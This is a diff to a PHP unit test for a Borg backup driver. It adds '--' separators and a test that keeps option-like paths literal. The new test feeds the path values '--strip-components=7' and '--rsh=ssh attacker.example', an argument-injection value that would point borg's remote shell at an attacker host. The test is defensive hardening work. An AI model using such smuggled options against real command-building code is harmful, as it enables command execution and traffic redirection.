@@ -148,6 +148,7 @@ final class BorgArchiveDriverTest extends TestCase
                 [
                     'borg',
                     'extract',
+                    '--',
                     '/var/lib/borg::backup',
                 ],
                 ['BORG_PASSPHRASE' => 'secret'],
@@ -192,6 +193,7 @@ final class BorgArchiveDriverTest extends TestCase
                     '7',
                     '--rsh',
                     "ssh -p '2222'",
+                    '--',
                     '/var/lib/borg::backup',
                     'var/lib/docker/volumes/wp/_data/wp-content',
                 ],
@@ -211,6 +213,46 @@ final class BorgArchiveDriverTest extends TestCase
             new ArchiveInfo('/var/lib/borg::backup', 'borg', 'borg'),
             sys_get_temp_dir(),
             ['/var/lib/docker/volumes/wp/_data/wp-content'],
+            7
+        );
+    }
+
+    public function test_extract_archive_keeps_option_looking_paths_literal(): void
+    {
+        $process = $this->createMock(ProcessRunner::class);
+
+        $process
+            ->expects($this->once())
+            ->method('run')
+            ->with(
+                [
+                    'borg',
+                    'extract',
+                    '--strip-components',
+                    '7',
+                    '--rsh',
+                    "ssh -p '2222'",
+                    '--',
+                    '/var/lib/borg::backup',
+                    '--strip-components=7',
+                    '--rsh=ssh attacker.example',
+                ],
+                ['BORG_PASSPHRASE' => 'secret'],
+                sys_get_temp_dir()
+            )
+            ->willReturn(new ProcessResult(exitCode: 0, output: '', errorOutput: ''));
+
+        $driver = new BorgArchiveDriver(
+            repository: '/var/lib/borg',
+            passphrase: 'secret',
+            sshPort: 2222,
+            process: $process,
+        );
+
+        $driver->extractArchive(
+            new ArchiveInfo('/var/lib/borg::backup', 'borg', 'borg'),
+            sys_get_temp_dir(),
+            ['--strip-components=7', '--rsh=ssh attacker.example'],
             7
         );
     }
